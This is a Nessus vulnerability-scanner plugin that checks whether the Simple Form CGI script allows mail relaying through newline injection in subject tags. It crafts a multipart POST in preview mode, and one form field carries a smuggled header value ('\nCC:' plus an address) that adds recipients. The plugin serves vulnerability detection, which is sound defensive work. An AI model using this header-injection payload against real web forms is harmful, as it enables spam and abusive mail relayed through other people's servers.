#%NASL_MIN_LEVEL 70300
#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#


include('deprecated_nasl_level.inc');
include('compat.inc');

if (description) {
  script_id(14713);
  script_version("1.14");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/08/15");


  script_name(english:"Simple Form Subject Tags Arbitrary Mail Relay");
  script_summary(english:"Checks for Mail Relaying via Subject Tags Vulnerability in Simple Form");

  script_set_attribute(attribute:"synopsis", value:
"The remote host contains an application that allows unauthorized mail
relaying.");
  script_set_attribute(attribute:"description", value:
"The target is running at least one instance of Simple Form which fails
to remove newlines from variables used to construct message headers.  A
remote attacker can exploit this flaw to add to the list of recipients,
enabling him to use Simple Form on the target as a proxy for sending
abusive mail or spam.");
  script_set_attribute(attribute:"see_also", value:"http://worldcommunity.com/opensource/utilities/simple_form.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to Simple Form 2.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");

  script_set_attribute(attribute:"plugin_publication_date", value:"2004/09/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004-2022 George A. Theall");
  script_family(english:"CGI abuses");

  script_dependencies("global_settings.nasl", "http_version.nasl", "smtp_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

host = get_host_name();
port = get_http_port(default:80, embedded:TRUE);
dbg::detailed_log(lvl:2, msg:"debug: searching for mail relaying via subject tags vulnerability in Simple Form on "+host+":"+port+".");

if (!get_port_state(port)) exit(0, "Port "+port+" is not open.");

to_email = get_kb_item('SMTP/headers/To');
if (!to_email) to_email = 'victim@example.com';

# Check for the form in each of the CGI dirs.
foreach dir (cgi_dirs()) {
  if (  is_cgi_installed_ka(item:dir + "/s_form.cgi", port:port) )
  {
  url = string(dir, "/s_form.cgi");
  dbg::detailed_log(lvl:2, msg:"debug: checking "+url+"...");

  # Exploit the form and *preview* the message to determine if the
  # vulnerability exists. Note: this doesn't actually inject a
  # message but should give us an idea if it is vulnerable.
  #
  # nb: preview mode won't actually show the modified subject so we
  #     check whether we have a vulnerable version by trying to set
  #     preview_response_title -- if we can, we're running a
  #     non-vulnerable version.
  boundary = "bound";
  req = string(
    "POST ",  url, " HTTP/1.1\r\n",
    "Host: ", host, "\r\n",
    "Referer: http://", host, "/\r\n",
    "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
    # nb: we'll add the Content-Length header and post data later.
  );
  boundary = string("--", boundary);
  postdata = string(
     boundary, "\r\n",
    'Content-Disposition: form-data; name="form_response_title"', "\r\n",
    "\r\n",
    "A Response\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="form_return_url"', "\r\n",
    "\r\n",
    "http://", host, "/\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="form_return_url_title"', "\r\n",
    "\r\n",
    "Home\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="form_fields"', "\r\n",
    "\r\n",
    "msg\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="required_fields"', "\r\n",
    "\r\n",
    "msg\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="form_email_subject"', "\r\n",
    "\r\n",
    "Nessus Plugin Test:!:xtra_recipients:!:\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="subject_tag_field"', "\r\n",
    "\r\n",
    "xtra_recipients\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="xtra_recipients"', "\r\n",
    "\r\n",
    "\nCC: " + to_email + "\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="msg"', "\r\n",
    "\r\n",
    "This is a mail relaying test.\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="preview_data"', "\r\n",
    "\r\n",
    "yes\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="preview_response_title"', "\r\n",
    "\r\n",
    "Nessus Plugin Preview",

    boundary, "--", "\r\n"
  );
  req = string(
    req,
    "Content-Length: ", strlen(postdata), "\r\n",
    "\r\n",
    postdata
  );
  if (debug_level) display("debug: sending =>>", req, "<<\n");
  res = http_keepalive_send_recv(port:port, data:req);
  if (res == NULL) exit(0, "The web server listening on port "+port+" did not respond.");
  if (debug_level) display("debug: received =>>", res, "<<\n");

  # Look at the preview and see whether we get *our* preview_response_title.
  if (
    "Nessus Plugin Test:!:xtra_recipients:!:" >< res &&
    "Nessus Plugin Preview" >!< res
  ) {
    security_warning(port);
    exit(0);
  }
 }
}
exit(0, "The web server listening on port "+port+" is not affected.");
